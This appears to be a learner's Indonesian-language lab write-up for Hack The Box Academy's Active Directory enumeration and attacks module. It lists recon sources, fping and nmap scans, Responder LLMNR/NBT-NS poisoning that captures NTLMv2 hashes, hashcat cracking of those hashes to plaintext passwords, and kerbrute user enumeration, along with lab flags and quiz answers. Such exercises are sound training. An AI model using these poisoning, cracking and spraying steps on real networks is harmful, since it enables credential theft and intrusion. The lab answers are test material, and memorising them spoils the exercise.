

## Daftar tempat recon

|**Sumber**|**Contoh**|
|---|---|
|`ASN / IP registrars`|[IANA](https://www.iana.org/) , [arin](https://www.arin.net/) untuk penelusuran di Amerika, [RIPE](https://www.ripe.net/) untuk penelusuran di Eropa, [BGP Toolkit](https://bgp.he.net/)|
|`Domain Registrars & DNS`|[Domaintools](https://www.domaintools.com/) , [PTRArchive](http://ptrarchive.com/) , [ICANN](https://lookup.icann.org/lookup) , permintaan catatan DNS manual terhadap domain yang dimaksud atau terhadap server DNS terkenal, seperti `8.8.8.8`.|
|`Social Media`|Telusuri Linkedin, Twitter, Facebook, situs media sosial utama di kawasan Anda, artikel berita, dan info relevan apa pun yang dapat Anda temukan tentang organisasi tersebut.|
|`Public-Facing Company Websites`|Seringkali, situs web publik suatu perusahaan memiliki informasi yang relevan. Artikel berita, dokumen yang disematkan, dan halaman "Tentang Kami" dan "Hubungi Kami" juga bisa menjadi tambang emas.|
|`Cloud & Dev Storage Spaces`|[GitHub](https://github.com/) , [bucket AWS S3 & wadah penyimpanan Azure Blog](https://grayhatwarfare.com/) , [pencarian Google menggunakan "Dorks"](https://www.exploit-db.com/google-hacking-database)|
|`Breach Data Sources`|[HaveIBeenPwned](https://haveibeenpwned.com/) untuk menentukan apakah ada akun email perusahaan yang muncul dalam data pelanggaran publik, [Dehashed](https://www.dehashed.com/) untuk mencari email perusahaan dengan kata sandi atau hash teks yang jelas yang dapat kami coba pecahkan secara offline. Kami kemudian dapat mencoba kata sandi ini terhadap portal masuk apa pun yang terbuka (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, aplikasi khusus, dll.) yang mungkin menggunakan otentikasi AD.|


# External Recon and Enumeration Principles

langkah perttama kunjungi website https://bgp.he.net/dns/inlanefreight.com

dan search inlanefreight.com, dan cek di txt records maka ada flag di situ

answer:
HTB{5Fz6UPNUFFzqjdg0AzXyxCjMZ}



# Initial Enumeration of the Domain

#### Poin Data Penting

|**Titik Data**|**Keterangan**|
|---|---|
|`AD Users`|Kami mencoba menghitung akun pengguna valid yang dapat kami targetkan untuk penyemprotan kata sandi.|
|`AD Joined Computers`|Komputer Utama termasuk Pengontrol Domain, server file, server SQL, server web, server email Exchange, server database, dll.|
|`Key Services`|Kerberos, NetBIOS, LDAP, DNS|
|`Vulnerable Hosts and Services`|Apa pun yang bisa menjadi kemenangan cepat. (alias tuan rumah yang mudah dieksploitasi dan mendapatkan pijakan)|

### Mengidentifikasi Host

Pertama, mari luangkan waktu untuk mendengarkan jaringan dan melihat apa yang terjadi. Kita bisa menggunakan `Wireshark` Dan `TCPDump` untuk "mendekatkan telinga" dan melihat host dan jenis lalu lintas jaringan apa yang dapat kami tangkap. Hal ini sangat membantu jika pendekatan penilaiannya bersifat "kotak hitam". Kami melihat beberapa [ARP](https://en.wikipedia.org/wiki/Address_Resolution_Protocol) permintaan dan balasan [, MDNS](https://en.wikipedia.org/wiki/Multicast_DNS) , dan [paket lapisan dua](https://www.juniper.net/documentation/us/en/software/junos/multicast-l2/topics/topic-map/layer-2-understanding.html) dasar lainnya (karena kami berada di jaringan yang diaktifkan, kami terbatas pada domain siaran saat ini) beberapa di antaranya dapat kami lihat di bawah. Ini adalah awal yang baik yang memberi kami sedikit informasi tentang pengaturan jaringan pelanggan.

[Responder](https://github.com/lgandx/Responder-Windows) adalah alat yang dibuat untuk mendengarkan, menganalisis, dan meracuni `LLMNR`, `NBT-NS`, Dan `MDNS` permintaan dan tanggapan.
Sekarang mari kita lakukan beberapa pemeriksaan aktif yang dimulai dengan sapuan ICMP cepat pada subnet menggunakan `fping`.

[Fping](https://fping.org/) memberi kita kemampuan serupa dengan aplikasi ping standar yang memanfaatkan permintaan dan balasan ICMP untuk menjangkau dan berinteraksi dengan host.


#### Pemeriksaan Aktif FPing

Di sini kita akan mulai `fping` dengan beberapa bendera: `a` untuk menunjukkan target yang masih hidup, `s` untuk mencetak statistik di akhir pemindaian, `g` untuk menghasilkan daftar target dari jaringan CIDR, dan `q` untuk tidak menampilkan hasil per target.

```bash
AexonFx@htb[/htb]$ fping -asgq 172.16.5.0/23

172.16.5.5
172.16.5.25
172.16.5.50
172.16.5.100
172.16.5.125
172.16.5.200
172.16.5.225
172.16.5.238
172.16.5.240

     510 targets
       9 alive
     501 unreachable
       0 unknown addresses

    2004 timeouts (waiting for response)
    2013 ICMP Echos sent
       9 ICMP Echo Replies received
    2004 other ICMP received

 0.029 ms (min round trip time)
 0.396 ms (avg round trip time)
 0.799 ms (max round trip time)
       15.366 sec (elapsed real time)
```


**Questions:**

```bash
┌─[htb-student@ea-attack01]─[~]
└──╼ $nmap -sVC -p- 172.16.5.5 --min-rate 1000 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2024-09-02 09:03 EDT
Stats: 0:01:34 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 83.68% done; ETC: 09:04 (0:00:18 remaining)
Nmap scan report for inlanefreight.local (172.16.5.5)
Host is up (0.083s latency).
Not shown: 55284 filtered tcp ports (no-response), 10242 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-09-02T13:06:04+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Not valid before: 2024-09-01T12:57:36
|_Not valid after:  2025-03-03T12:57:36
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-EA-DC01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2024-09-02T13:05:56+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-02T13:05:56
|_  start_date: N/A
|_nbstat: NetBIOS name: ACADEMY-EA-DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:17:f1 (VMware)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 182.46 seconds

```

Answer: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL


**Question 2 :**

```bash
┌─[✗]─[aexon@parrot]─[~]
└──╼ $ssh htb-student@10.129.92.204
htb-student@10.129.92.204's password: 
Linux ea-attack01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
| |_) / _` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|
                                                 


Nmap scan report for 172.16.5.130
Host is up (0.83s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
808/tcp   open  ccproxy-http?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-02T12:57:48
| Not valid after:  2054-09-02T12:57:48
| MD5:   345a 5d41 6951 a55c a3a6 8ef6 63bb 573e
|_SHA-1: 6b87 fdbc b675 39f0 60b5 c71d 77db e835 4e50 0ccc
| ms-sql-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-EA-FILE
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|_  Product_Version: 10.0.17763
|_ssl-date: 2024-09-02T14:12:19+00:00; 0s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-EA-FILE
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2024-09-02T14:10:34+00:00
|_ssl-date: 2024-09-02T14:12:19+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
| Issuer: commonName=ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-01T12:57:34
| Not valid after:  2025-03-03T12:57:34
| MD5:   80ed 9311 ea01 3922 4cd0 c29b 429b cac1
|_SHA-1: a2a6 146b fff8 1a6c 34a3 0ed1 98d8 2f85 9096 2816
16001/tcp open  mc-nmf        .NET Message Framing
60020/tcp open  unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: ACADEMY-EA-FILE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:ee:65 (VMware)
| Names:
|   ACADEMY-EA-FILE<00>  Flags: <unique><active>
|   INLANEFREIGHT<00>    Flags: <group><active>
|_  ACADEMY-EA-FILE<20>  Flags: <unique><active>
| ms-sql-info: 
|   172.16.5.130:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-time: 
|   date: 2024-09-02T14:10:34
|_  start_date: N/A



```

answer: 172.16.5.130


# LLMNR/NBT-NS Poisoning - from Linux


```bash
┌─[✗]─[htb-student@ea-attack01]─[~]
└──╼ $sudo responder -I ens224
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [ens224]
    Responder IP               [172.16.5.225]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-ITION7XZ9OL]
    Responder Domain Name      [YVIK.LOCAL]
    Responder DCE-RPC Port     [47042]
[!] Error starting TCP server on port 3389, check permissions or other servers running.

[+] Listening for events...

[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[MSSQL] NTLMv2 Client   : 172.16.5.130
[MSSQL] NTLMv2 Username : INLANEFREIGHT\lab_adm
[MSSQL] NTLMv2 Hash     : lab_adm::INLANEFREIGHT:3e92b8d2eb65b4a9:D5B85F199F889AF90948E41137698829:0101000000000000BD7497F750FDDA010ADBD47AFB5FE0E000000000020008005900560049004B0001001E00570049004E002D004900540049004F004E00370058005A0039004F004C00040014005900560049004B002E004C004F00430041004C0003003400570049004E002D004900540049004F004E00370058005A0039004F004C002E005900560049004B002E004C004F00430041004C00050014005900560049004B002E004C004F00430041004C0008003000300000000000000000000000003000007586B6C845BB7D4FAE89898A426654219724B4E99B9FFA4CF197EAD811D38A280A00100000000000000000000000000000000000090046004D005300530051004C005300760063002F00610063006100640065006D0079002D00650061002D0077006500620030002E006C006F00630061006C003A0031003400330033000000000000000000


[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:28d7fe8af9c2a6f4:F4EAF322835753F53993E45BB0C35B97:0101000000000000008D24A42FFDDA01102FB5A1FD9E887F00000000020008004700320056005A0001001E00570049004E002D0031005700340058004F004A00320034004D005300580004003400570049004E002D0031005700340058004F004A00320034004D00530058002E004700320056005A002E004C004F00430041004C00030014004700320056005A002E004C004F00430041004C00050014004700320056005A002E004C004F00430041004C0007000800008D24A42FFDDA01060004000200000008003000300000000000000000000000003000007586B6C845BB7D4FAE89898A426654219724B4E99B9FFA4CF197EAD811D38A280A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000

[SMB] NTLMv2-SSP Hash     : wley::INLANEFREIGHT:31b129206c79d319:DF6C036DF1AD10E72E9132FC65134D2C:0101000000000000003AEC3D30FDDA0177301551EF4E86F200000000020008004A0052005300520001001E00570049004E002D003200360034003800590046004300450038004D00530004003400570049004E002D003200360034003800590046004300450038004D0053002E004A005200530052002E004C004F00430041004C00030014004A005200530052002E004C004F00430041004C00050014004A005200530052002E004C004F00430041004C0007000800003AEC3D30FDDA01060004000200000008003000300000000000000000000000003000007586B6C845BB7D4FAE89898A426654219724B4E99B9FFA4CF197EAD811D38A280A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000


```

answer question 1 : backupagent

```bash
┌─[aexon@parrot]─[~/Desktop/learn-anything/hackthebox academy/Active Directory/Active directory enum & attacks]
└──╼ $hashcat -m 5600 -a 0 hash_backupagent.txt ~/tools/wordlist/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-skylake-avx512-Intel(R) Core(TM) i3-1005G1 CPU @ 1.20GHz, 2784/5633 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /home/aexon/tools/wordlist/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

BACKUPAGENT::INLANEFREIGHT:28d7fe8af9c2a6f4:f4eaf322835753f53993e45bb0c35b97:0101000000000000008d24a42ffdda01102fb5a1fd9e887f00000000020008004700320056005a0001001e00570049004e002d0031005700340058004f004a00320034004d005300580004003400570049004e002d0031005700340058004f004a00320034004d00530058002e004700320056005a002e004c004f00430041004c00030014004700320056005a002e004c004f00430041004c00050014004700320056005a002e004c004f00430041004c0007000800008d24a42ffdda01060004000200000008003000300000000000000000000000003000007586b6c845bb7d4fae89898a426654219724b4e99b9ffa4cf197ead811d38a280a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:h1backup55
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: BACKUPAGENT::INLANEFREIGHT:28d7fe8af9c2a6f4:f4eaf32...000000
Time.Started.....: Mon Sep  2 23:05:34 2024 (6 secs)
Time.Estimated...: Mon Sep  2 23:05:40 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/aexon/tools/wordlist/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1281.5 kH/s (1.20ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7733248/14344385 (53.91%)
Rejected.........: 0/7733248 (0.00%)
Restore.Point....: 7731200/14344385 (53.90%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: h2nzyoo -> h101814
Hardware.Mon.#1..: Temp: 71c Util: 86%

Started: Mon Sep  2 23:05:18 2024
Stopped: Mon Sep  2 23:05:42 2024
```

answer question 2 : h1backup55

```bash
┌─[aexon@parrot]─[~/Desktop/learn-anything/hackthebox academy/Active Directory/Active directory enum & attacks]
└──╼ $hashcat -m 5600 -a 0 hash_wley.txt ~/tools/wordlist/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-skylake-avx512-Intel(R) Core(TM) i3-1005G1 CPU @ 1.20GHz, 2784/5633 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /home/aexon/tools/wordlist/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

WLEY::INLANEFREIGHT:31b129206c79d319:df6c036df1ad10e72e9132fc65134d2c:0101000000000000003aec3d30fdda0177301551ef4e86f200000000020008004a0052005300520001001e00570049004e002d003200360034003800590046004300450038004d00530004003400570049004e002d003200360034003800590046004300450038004d0053002e004a005200530052002e004c004f00430041004c00030014004a005200530052002e004c004f00430041004c00050014004a005200530052002e004c004f00430041004c0007000800003aec3d30fdda01060004000200000008003000300000000000000000000000003000007586b6c845bb7d4fae89898a426654219724b4e99b9ffa4cf197ead811d38a280a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:transporter@4
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: WLEY::INLANEFREIGHT:31b129206c79d319:df6c036df1ad10...000000
Time.Started.....: Mon Sep  2 23:08:17 2024 (2 secs)
Time.Estimated...: Mon Sep  2 23:08:19 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/aexon/tools/wordlist/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1422.0 kH/s (1.27ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3098624/14344385 (21.60%)
Rejected.........: 0/3098624 (0.00%)
Restore.Point....: 3096576/14344385 (21.59%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: trapping1 -> tramore1993
Hardware.Mon.#1..: Temp: 68c Util: 88%

Started: Mon Sep  2 23:08:16 2024
Stopped: Mon Sep  2 23:08:21 2024

```

answer question 3 : transporter@4


# LLMNR/NBT-NS Poisoning - from Windows


```bash
[+] [09:37:09] SMB(445) NTLMv2 captured for [INLANEFREIGHT\svc_qualys] from 172.16.5.130(ACADEMY-EA-FILE):50353:                                                                                                                                                         svc_qualys::INLANEFREIGHT:5592A0F7542EB383:E94045D2EAD720FC88DDDF1A6271D48B:010100000000000036E0155B56FDDA01C2B1A4F52720D3E00000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080036E0155B56FDDA01060004000200000008003000300000000000000000000000003000009F88BDFDD89DBB9310D8EC6E785195B6BBBBC7D6FDDF478DB64721DCEC3DF5450A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000   
```


**Cracking Password**

```bash
┌─[aexon@parrot]─[~/Desktop/learn-anything/hackthebox academy/Active Directory/Active directory enum & attacks]
└──╼ $hashcat -m 5600 -a 0 hash_svc_qualys.txt ~/tools/wordlist/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-skylake-avx512-Intel(R) Core(TM) i3-1005G1 CPU @ 1.20GHz, 2784/5633 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /home/aexon/tools/wordlist/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

SVC_QUALYS::INLANEFREIGHT:5592a0f7542eb383:e94045d2ead720fc88dddf1a6271d48b:010100000000000036e0155b56fdda01c2b1a4f52720d3e00000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00450041002d004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004600410043004100440045004d0059002d00450041002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000700080036e0155b56fdda01060004000200000008003000300000000000000000000000003000009f88bdfdd89dbb9310d8ec6e785195b6bbbbc7d6fddf478db64721dcec3df5450a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0035002e00320035000000000000000000:security#1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SVC_QUALYS::INLANEFREIGHT:5592a0f7542eb383:e94045d2...000000
Time.Started.....: Mon Sep  2 23:42:18 2024 (3 secs)
Time.Estimated...: Mon Sep  2 23:42:21 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/aexon/tools/wordlist/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1357.6 kH/s (1.25ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3923968/14344385 (27.36%)
Rejected.........: 0/3923968 (0.00%)
Restore.Point....: 3921920/14344385 (27.34%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: sed73alb! -> seciocastor2
Hardware.Mon.#1..: Temp: 69c Util: 88%

Started: Mon Sep  2 23:42:18 2024
Stopped: Mon Sep  2 23:42:22 2024

```

answer: security#1


# Enumerating & Retrieving Password Policies

Berapa panjang kata sandi minimum default saat domain baru dibuat? (Satu nomor)
answer: 7


Berapa minPwdLength yang disetel di domain INLANEFREIGHT.LOCAL? (Satu nomor)
answer: 8


# Password Spraying - Making a Target User List

```shell
┌─[htb-student@ea-attack01]─[~]
└──╼ $kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 09/03/24 - Ronnie Flathers @ropnop

2024/09/03 02:04:41 >  Using KDC(s):
2024/09/03 02:04:41 >  	172.16.5.5:88

2024/09/03 02:04:41 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local
2024/09/03 02:04:41 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
